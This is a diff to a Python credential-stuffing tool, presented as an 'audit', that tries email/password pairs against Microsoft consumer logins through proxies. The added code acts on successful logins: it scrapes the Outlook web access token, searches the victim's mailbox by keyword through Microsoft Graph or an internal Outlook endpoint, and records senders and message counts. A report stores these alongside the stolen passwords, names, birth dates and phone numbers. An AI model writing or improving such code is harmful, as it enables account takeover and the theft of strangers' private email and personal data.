@@ -281,26 +281,80 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
         if "kmsi" in res2.url.lower() or "kmsi" in res2.text.lower() or "oauth2" in res2.url.lower():
             # ¡HITS POSITIVO!
             
-            # --- BRIDGE SSO A OUTLOOK.LIVE.COM ---
-            # El login mobile solo crea cookies en microsoftonline.com.
-            # Para llamar a la API de buzón necesitamos cookies en outlook.live.com.
-            # Visitamos el portal web de Outlook para que Microsoft transfiera la sesión.
+            # --- BRIDGE SSO + EXTRACCIÓN DE TOKEN OWA ---
+            owa_access_token = None
+            senders_found = {}
+            subject_count = "N/A"
             try:
                 owa_res = session.get("https://outlook.live.com/mail/0/inbox", 
                                       verify=False, timeout=15, allow_redirects=True)
-                # Si hay un formulario SSO oculto, lo enviamos para completar el bridge
-                if "<form" in owa_res.text and "login" in owa_res.url.lower():
-                    form_action = re.search(r'action="([^"]+)"', owa_res.text, re.IGNORECASE)
-                    if form_action:
-                        bridge_url = form_action.group(1).replace("&#x3a;", ":").replace("&#x2f;", "/")
-                        inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', owa_res.text, re.IGNORECASE)
-                        bridge_data = {k: v for k, v in inputs}
-                        session.post(bridge_url, data=bridge_data, verify=False, timeout=15, allow_redirects=True)
+                owa_html = owa_res.text
+                
+                # Extraer token embebido en el boot script de OWA
+                # El SPA de Outlook embebe el accessToken en una variable JS de configuración
+                token_patterns = [
+                    r'"accessToken"\s*:\s*"([^"]{50,})"',
+                    r'access_token=([A-Za-z0-9._\-]{50,})&',
+                    r'"token"\s*:\s*"([A-Za-z0-9._\-]{100,})"',
+                    r'Bearer ([A-Za-z0-9._\-]{100,})',
+                ]
+                for pat in token_patterns:
+                    m = re.search(pat, owa_html)
+                    if m:
+                        owa_access_token = m.group(1)
+                        break
+                        
+                # Si encontramos token, buscar mensajes coincidentes
+                if owa_access_token and keyword:
+                    q = keyword.replace('"', '').replace("'", "")
+                    search_url = f"https://graph.microsoft.com/v1.0/me/messages?$search=%22{q}%22&$top=15&$select=from&$count=true"
+                    graph_headers = {
+                        "Authorization": f"Bearer {owa_access_token}",
+                        "Accept": "application/json",
+                        "ConsistencyLevel": "eventual"
+                    }
+                    gr = session.get(search_url, headers=graph_headers, verify=False, timeout=15)
+                    if gr.status_code == 200:
+                        gdata = gr.json()
+                        subject_count = gdata.get("@odata.count", len(gdata.get("value", [])))
+                        for msg in gdata.get("value", []):
+                            s = msg.get("from", {}).get("emailAddress", {}).get("address", "")
+                            if s: senders_found[s] = senders_found.get(s, 0) + 1
+                            
+                # Si no tenemos token, intentar con cookies (OWA REST interno)
+                elif keyword:
+                    q = keyword.replace('"', '').replace("'", "")
+                    # Extraer canary de cookies para OWA interna
+                    owa_canary = session.cookies.get("X-OWA-CANARY") or ""
+                    owa_search_headers = {
+                        **api_headers,
+                        "X-OWA-CANARY": owa_canary,
+                        "Action": "FindItem",
+                        "X-OWA-ActionName": "FindMailItem"
+                    }
+                    search_url2 = f"https://outlook.live.com/owa/service.svc?action=FindItem&app=Mail"
+                    # Este intento con SOAP-lite quedará silencioso si falla
+                    try:
+                        gr2 = session.post(search_url2, 
+                            json={"__type":"FindItemJsonRequest:#Exchange","Header":{"__type":"JsonRequestHeaders:#Exchange","RequestServerVersion":"V2018_01_08","TimeZoneContext":{"__type":"TimeZoneContext:#Exchange","TimeZoneDefinition":{"__type":"TimeZoneDefinitionType:#Exchange","Id":"UTC"}}},"Body":{"__type":"FindItemJsonRequestMessage:#Exchange","ItemShape":{"__type":"ItemResponseShape:#Exchange","BaseShape":"IdOnly","AdditionalProperties":[{"__type":"PropertyUri:#Exchange","FieldURI":"message:From"}]},"ParentFolderIds":[{"__type":"DistinguishedFolderId:#Exchange","Id":"inbox"}],"Traversal":"Shallow","QueryString":q,"Paging":{"__type":"IndexedPageView:#Exchange","BasePoint":"Beginning","Offset":0,"MaxEntriesReturned":15},"ShapeName":"MailListItem"}},
+                            headers=owa_search_headers, verify=False, timeout=15)
+                        if gr2.status_code == 200:
+                            gd2 = gr2.json()
+                            msgs = gd2.get("Body", {}).get("ResponseMessages", {}).get("Items", [])
+                            for m_wrap in msgs:
+                                items = m_wrap.get("RootFolder", {}).get("Items", [])
+                                for item in items:
+                                    s = item.get("From", {}).get("Mailbox", {}).get("EmailAddress", "")
+                                    if s: senders_found[s] = senders_found.get(s, 0) + 1
+                            subject_count = sum(senders_found.values()) if senders_found else "N/A"
+                    except:
+                        pass
             except:
                 pass
                 
             owa_canary = session.cookies.get("X-OWA-CANARY") or ""
             api_headers["X-OWA-CANARY"] = owa_canary
+
 
             profile_res = session.get("https://login.microsoftonline.com/consumers/profile/v1.0/me", verify=False, timeout=15)
             country = "XZ"
@@ -453,11 +507,14 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
             elif email_domain.endswith('.pt') or email_domain == 'hotmail.pt': country = 'PT'
 
         if getattr(hits_buffer, 'append', None) is not None:
+            formatted_senders = ", ".join([f"{addr} ({cnt})" for addr, cnt in senders_found.items()]) if senders_found else "N/A"
             hits_buffer.append({
                 "email": email,
                 "pass": password,
                 "domain": "outlook.com",
                 "match": keyword if keyword else "HOTMAIL HQ",
+                "messages": subject_count,
+                "senders": formatted_senders,
                 "country": country,
                 "name": name,
                 "dob": dob,
@@ -629,6 +686,12 @@ def send_consolidated_report(hits):
                     f.write(f"EMAIL: {h['email']} | PASS: {h['pass']}\n")
                     f.write(f"PAIS: {h['country']} | NOMBRE: {h.get('name', 'N/A')}\n")
                     f.write(f"DOB: {h.get('dob', 'N/A')} | TELEFONO: {h.get('phone', 'N/A')}\n")
+                    senders = h.get('senders', 'N/A')
+                    msgs = h.get('messages', 'N/A')
+                    if senders != 'N/A':
+                        f.write(f"📧 REMITENTES OBJETIVO ({msgs} emails encontrados):\n")
+                        for s_entry in senders.split(", "):
+                            f.write(f"   → {s_entry}\n")
                     f.write("-" * 50 + "\n")
                 f.write("\n\n")
 
